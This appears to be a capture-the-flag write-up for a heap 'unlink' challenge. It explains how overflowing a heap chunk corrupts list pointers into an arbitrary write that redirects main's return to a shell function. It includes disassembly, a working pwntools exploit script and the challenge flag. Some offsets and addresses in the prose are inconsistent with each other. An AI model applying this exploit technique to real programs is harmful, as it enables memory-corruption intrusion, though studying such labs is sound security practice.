# Description
```
How much can you control memory with unlink corruption?
```
---
We are hinted to overflow the heap, so I first made a sketch of what the heap supposedly looks like and went over the `unlink` function with normal input - I understood it just makes A point to C at its `fd`, and C point to A at its `bk`. As expected. 

We can override those pointer values to whatever we want. I first thought of how I can use the address of the `shell` function (static, with `readelf`: `0x080491d6`) - 
The problem is that if we overwrite either A* or C* in B to make the return address be the shell function, the `unlink` function will have to write to the shell function.

After following the precise debug on paper, looking at the stack - it seems there is an unused (or rather unknown use of the) value on `$ebp - 8`, right before `A`'s stack pointer. 
Looking at this `main` segment after the call to the `unlink` function:
```asm
.text:08049323 call    unlink
.text:08049328 add     esp, 16
.text:0804932B mov     eax, 0
.text:08049330 lea     esp, [ebp-8]
.text:08049333 pop     ecx
.text:08049334 pop     ebx
.text:08049335 pop     ebp
.text:08049336 lea     esp, [ecx-4]
.text:08049339 retn
```
It seems like it is loaded to `esp` (meaning the stack pointer points to it), then we pop its value into `ecx`, and at the second to last line, it moves `esp` to `$ecx-4`?? What is this? Seems like we have found the value we could overwrite to - as the `main` function returns to whatever is pointed by `$ecx -4`. Therefore, we'd need to make `$ebx - 8` hold `&shell`.


#### Overwriting the heap 
Before overwriting this is how the heap and stack look like this;
Heap:

| A start |      |     |     | B start |     |     |     | C start |     |     |     |
| ------- | ---- | --- | --- | ------- | --- | --- | --- | ------- | --- | --- | --- |
| 4       | 4    | 8   | 16  | 4       | 4   | 8   | 16  | 4       | 4   | 8   | 8?  |
| &B      | ---- | b   | --- | &C      | &A  | b   | --- | ---     | &B  | b   | --- |
(&N = address on heap, b = buffer, --- = IDC - unallocated/ `malloc` chunk metadata - size is platform dependent)
Stack:

| ebp+4    | &main    |               |
| -------- | -------- | ------------- |
| ebp      | &ebp     |               |
| ebp - 4  | OVERRIDE | Future return |
| ebp - 8  | &C       |               |
| ebp - 0C | &B       |               |
| EBP -10  | &A       |               |
|          |          |               |

We control `&A+8` and forwards --->
That means we can use the logic of `unlink` to our advantage and make `$ebp-4` point to wherever we want.

```C
# Logic happening inside `unlink` regarding this heap example
# Seems a bit unclear unless you read the assembly
1. *(*(&B)+4) = *((&B+4));
2. *((&B+4)) = *(&B);

/**
 * After overwrite we want to achieve this;
 * 1. B->fd = $ebp-8
 * 2. B->bk = &A->buf+4
 * Because:
 */
1. *($ebp-4) = *(&A->buf+4);
2. *(&A->buf+4) = *($ebp-4);
```


Applying this logic, we need to input the following to `gets`:
```python
python2 -c 'print "&shell" + "A" * 12 + "&A+{offset_to_ebp-4}>" + "A->buf+4"
```

Let's write it with `pwntools`:

```python
from pwn import *  
  
SHELL = 0x080491d6  # readelf -a | grep shell  
PATTERN = re.compile(rb"0x[^\n]+")  
  
context.log_level = "debug"  
get_address = lambda: int(PATTERN.search(p.recvline()).group(0), 16)  
  
p = process("/home/unlink/unlink")  
# Receive initial 3 lines  
a_stack, a_heap, _ = get_address(), get_address(), p.recvline()  
print(f"Stack: {a_stack:#x}, heap: {a_heap:#x}")  
  
ebp_4 = a_stack + 8  
a_buf = a_heap + 8  
  
p.sendline(  
    p32(SHELL) +  
    b"A" * 20 +  
    p32(ebp_4) +  
    p32(a_buf + 4)  
)  
p.interactive()
```


# Flag
```
wr1te_what3ver_t0_4nywh3re
```